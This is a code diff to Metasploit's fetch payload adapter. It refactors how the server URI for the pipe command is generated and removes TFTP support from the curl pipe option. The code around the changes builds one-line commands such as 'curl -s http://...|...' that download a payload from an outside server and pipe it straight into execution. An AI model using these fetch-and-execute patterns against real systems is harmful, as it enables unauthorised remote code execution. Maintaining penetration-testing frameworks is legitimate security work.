@@ -33,7 +33,7 @@ module Msf::Payload::Adapter::Fetch
   # in Framework, and if the underlying payload type/host/port are the same, the URI
   # will be, too.
   #
-  def default_srvuri
+  def default_srvuri(extra_data = nil)
     # If we're in framework, payload is in datastore; msfvenom has it in refname
     payload_name = datastore['payload'] ||= refname
     decoded_uri = payload_name.dup
@@ -59,6 +59,7 @@ module Msf::Payload::Adapter::Fetch
       end
     end
     decoded_uri << ";#{netloc}"
+    decoded_uri << ";#{extra_data}" unless extra_data.nil?
     Base64.urlsafe_encode64(OpenSSL::Digest::MD5.new(decoded_uri).digest, padding: false)
   end
 
@@ -109,11 +110,7 @@ module Msf::Payload::Adapter::Fetch
 
   def generate_pipe_command
     # TODO: Make a check method that determines if we support a platform/server/command combination
-    if srvuri.length < 3
-      @pipe_uri = srvuri + 'p'
-    else
-      @pipe_uri = srvuri[...3]
-    end
+    @pipe_uri = pipe_srvuri
 
     case datastore['FETCH_COMMAND'].upcase
     when 'WGET'
@@ -178,9 +175,16 @@ module Msf::Payload::Adapter::Fetch
   end
 
   def srvuri
+    # If the user has selected FETCH_PIPE, we save any user-defined uri for the pipe command
+    return default_srvuri if datastore['FETCH_PIPE'] || datastore['FETCH_URIPATH'].blank?
+
+    datastore['FETCH_URIPATH']
+  end
+
+  def pipe_srvuri
     return datastore['FETCH_URIPATH'] unless datastore['FETCH_URIPATH'].blank?
 
-    default_srvuri
+    default_srvuri('pipe')
   end
 
   def windows?
@@ -327,8 +331,6 @@ module Msf::Payload::Adapter::Fetch
       return "curl -s http://#{_download_pipe}|#{execute_cmd}"
     when 'HTTPS'
       return "curl -sk https://#{_download_pipe}|#{execute_cmd}"
-    when 'TFTP'
-      return "curl -s tftp://#{_download_pipe}|#{execute_cmd}"
     else
       fail_with(Msf::Module::Failure::BadConfig, "Unsupported protocol: #{fetch_protocol.inspect}")
     end
